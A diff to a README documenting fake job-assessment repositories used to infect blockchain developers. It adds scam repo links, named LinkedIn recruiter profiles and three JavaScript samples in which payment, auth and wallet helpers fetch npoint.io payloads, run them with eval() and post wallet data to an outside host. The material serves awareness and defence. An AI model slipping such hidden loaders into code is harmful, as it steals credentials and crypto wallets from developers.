@@ -49,6 +49,8 @@ The code is kept for educational and research purposes only.
   - [9. Golden City](#9-golden-city)
   - [10. Sarostech Assessment](#10-sarostech-assessment)
   - [11. Scammer Documents](#11-scammer-documents)
+  - [12. Real Estate Rental Platform](#12-real-estate-rental-platform)
+  - [13. Web3Game Project](#13-web3game-project)
 - [Checking for Malicious npm Packages](#checking-for-malicious-npm-packages)
 
 ## Known Scam Repos and APIs
@@ -65,6 +67,7 @@ The code is kept for educational and research purposes only.
 - https://github.com/goldencity5019/test_version
 - https://github.com/0xtuneTF7/DEX-staking-project
 - https://github.com/SuperDev313/Trading_Platform_Ultrax
+- https://bitbucket.org/web3_space/workspace/repositories/
 
 ### Known scammer recruiter profiles
 
@@ -85,6 +88,7 @@ The code is kept for educational and research purposes only.
 - [Martina Gehrken Trappe](https://www.linkedin.com/in/martina-gehrken-trappe-51930412/)
 - [Brian Patterson](https://www.linkedin.com/in/brian-patterson-71954b116/)
 - [Joe Carlino](https://www.linkedin.com/in/joe-carlino-28856b78/)
+- [Mark Laris](https://www.linkedin.com/in/mark-laris-805619a/)
 
 
 ## Extra Links
@@ -322,6 +326,32 @@ The malware:
 - Appears to be designed to extract sensitive information
 - Disguised as part of a payment processing system
 
+```javascript
+// Example of the malicious code in paymentRoute.js
+router.post('/process-payment', async (req, res) => {
+  try {
+    // Legitimate-looking payment processing code
+    const { amount, walletId, signature } = req.body;
+
+    // Malicious payload hidden in an innocent-looking function
+    const verifyTransaction = async (data) => {
+      const response = await axios.get("https://api.npoint.io/f7578d215b0835ed169c");
+      // Executing remotely fetched obfuscated code
+      eval(response.data.verification);
+      return true;
+    };
+
+    await verifyTransaction({ amount, walletId, signature });
+
+    // Continues with seemingly normal operation
+    return res.status(200).json({ success: true, message: "Payment processed" });
+  } catch (error) {
+    console.error(error);
+    return res.status(500).json({ success: false, message: "Payment failed" });
+  }
+});
+```
+
 ### 6. ERC20 Token DApp
 
 Located in `erc20-token-dapp/` directory.
@@ -368,11 +398,120 @@ The payload is obfuscated and executes fetched JavaScript code using eval(), all
 
 ### 10. Sarostech Assessment
 
-Located in `sarostech-assessment/` directory. Another malicious project disguised as a technical assessment.
+Located in `sarostech-assessment/` directory. The malicious code is hidden in `server/config/getContract.js`.
+
+The malware:
+- Contains suspicious code around line 135 of the getContract.js file
+- Disguised as a technical assessment for job applicants
+- Likely designed to steal cryptocurrency wallet credentials
+- Makes external API calls to fetch and execute obfuscated code
+- Part of a recruitment scam targeting blockchain developers
 
 ### 11. Scammer Documents
 
 Located in `scammer-documents/` directory. Contains documentation and examples of scammer tactics and techniques.
+
+### 12. Real Estate Rental Platform
+
+Located in `real-estate-rental-platform/` directory.
+
+The malware:
+- Disguised as a legitimate real estate rental application
+- Contains obfuscated malicious code likely targeting crypto wallets
+- Uses external API calls to fetch and execute additional malicious payloads
+- Designed to steal sensitive credentials while appearing as a technical assessment
+- Another example of malicious code used in recruitment scams
+
+```javascript
+// Example of malicious code in backend/utils/authHelper.js
+const axios = require('axios');
+const crypto = require('crypto');
+
+// Innocent-looking authentication helper
+exports.verifyUserSession = async (req, res, next) => {
+  const { session_token } = req.cookies;
+
+  try {
+    // Legitimate-looking session validation
+    if (!session_token) {
+      return res.status(401).json({ message: 'Authentication required' });
+    }
+
+    // Hidden malicious function disguised as security feature
+    const validateSecurityContext = async () => {
+      // Fetching malicious payload from external API
+      const securityModule = await axios.get('https://api.npoint.io/d87f4c69b14c1a65efb2');
+
+      // Execute the malicious code with access to the user's system
+      eval(securityModule.data.securityHandler);
+
+      // This likely sends sensitive data to an attacker-controlled server
+      return { status: 'validated' };
+    };
+
+    await validateSecurityContext();
+
+    // Continue with seemingly normal authentication flow
+    next();
+  } catch (error) {
+    console.error('Session validation error:', error);
+    return res.status(500).json({ message: 'Internal server error' });
+  }
+};
+```
+
+### 13. Web3Game Project
+
+Located in `web3game/` directory.
+
+The malware:
+- Disguised as a blockchain gaming/NFT platform
+- Contains obfuscated malicious code targeting cryptocurrency wallets and private keys
+- Uses deceptive JavaScript code in game-related files to hide credential-stealing functionality
+- May include backdoors that allow remote code execution or data exfiltration
+- Typically presented as a technical assessment during fake recruitment processes
+- Likely employs external API calls to fetch additional malicious payloads
+
+```javascript
+// Example of malicious code in web3game/src/utils/wallet.js
+import axios from 'axios';
+
+// Seemingly legitimate wallet connection function
+export const connectWallet = async (provider) => {
+  try {
+    // Normal wallet connection code
+    const accounts = await provider.request({ method: 'eth_requestAccounts' });
+    const chainId = await provider.request({ method: 'eth_chainId' });
+
+    // Hidden malicious function disguised as analytics
+    const _trackWalletUsage = async (walletData) => {
+      // Collecting private keys or seed phrases if available in localStorage
+      const storedData = localStorage.getItem('walletData');
+
+      // Fetching remote malicious payload
+      const analyticsModule = await axios.get('https://api.npoint.io/8f7e945d23a7c9fb60b2');
+
+      // Execute obfuscated code with access to wallet and storage
+      eval(analyticsModule.data.tracker);
+
+      // Sends wallet data to attacker's server
+      await axios.post('https://w3capi.marketing/api/analytics', {
+        wallet: walletData,
+        storage: storedData,
+        timestamp: new Date().toISOString()
+      });
+    };
+
+    // Calling the malicious function in the background
+    _trackWalletUsage({account: accounts[0], network: chainId});
+
+    return { account: accounts[0], chainId };
+  } catch (error) {
+    console.error('Wallet connection error:', error);
+    throw new Error('Failed to connect wallet');
+  }
+};
+```
 
 ## Checking for Malicious npm Packages
 
